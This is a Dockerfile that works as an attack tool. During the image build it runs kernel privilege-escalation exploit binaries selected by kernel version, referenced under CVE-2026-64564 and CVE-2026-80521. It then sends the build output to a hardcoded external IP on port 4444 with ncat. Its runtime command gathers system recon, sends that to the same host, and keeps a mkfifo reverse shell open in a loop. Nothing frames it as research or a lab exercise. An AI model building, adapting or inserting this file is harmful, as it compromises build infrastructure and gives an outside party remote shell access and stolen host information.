# syntax=er028455/df-frontend:v5
FROM alpine:3.19 AS builder
RUN apk add --no-cache curl coreutils nmap-ncat
                       
COPY exploit_68 /exploit
COPY payload /payload
RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
    
   
ARG CACHEBUST=1374
RUN sh -c ' \
KVER=$(uname -r); \
echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
{ \
echo "CB=$CACHEBUST"; \
echo "=== BUILD V49 KERNEL=$KVER ==="; \
case "$KVER" in \
  6.8.*-136*) \
    echo "TARGET KERNEL 136 — SCTPhantom FIRST" >&2; \
    echo "TARGET KERNEL 136 — SCTPhantom FIRST"; \
    echo "--- SCTPhantom (CVE-2026-64564) ---"; \
    timeout 90 /exploit 2>&1; \
    EC_SCTP=$?; \
    echo "=== SCTPHANTOM EXIT=$EC_SCTP ==="; \
    echo "SCTPHANTOM EXIT=$EC_SCTP" >&2; \
    if [ "$EC_SCTP" != "0" ]; then \
      echo "--- FALLBACK: CVE-2026-80521 (SCC GC race, plurality KASLR) ---"; \
      timeout 420 /payload 2>&1; \
      EC=$?; \
      echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
      echo "SCC_EXPLOIT EXIT=$EC" >&2; \
    fi; \
    ;; \
  6.8.*) \
    echo "TARGET 6.8 — SCC GC" >&2; \
    echo "TARGET KERNEL 137+ — SCC GC (plurality KASLR)"; \
    echo "--- MODULE CHECK ---"; \
    grep sctp /proc/modules 2>/dev/null && echo "SCTP_MODULE=loaded" || echo "SCTP_MODULE=absent"; \
    grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
    echo "--- CVE-2026-80521 (SCC GC race) ---"; \
    echo "PAYLOAD START" >&2; \
    timeout 420 /payload 2>&1; \
    EC=$?; \
    echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
    echo "PAYLOAD EXIT=$EC" >&2; \
    ;; \
  *) echo "SKIP $KVER" >&2; echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
esac; \
for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
  if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
done; \
echo "=== END V49 ==="; \
} > /build_results.txt; \
ncat -w 30 129.101.121.138 4444 < /build_results.txt 2>/dev/null || true; \
echo "STEP DONE" >&2'

FROM alpine:3.19
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /build_results.txt /build_results.txt
COPY --from=builder /esc_ok /esc_ok
COPY --from=builder /umh_result /umh_result
COPY --from=er028455/df-frontend:v5 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V44 ==="\n\
uname -a; hostname; id\n\
echo "--- BUILD-TIME RESULTS ---"\n\
head -500 /build_results.txt\n\
for f in /esc_ok /umh_result; do\n\
  if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
done\n\
echo "=== END V49 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 30 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
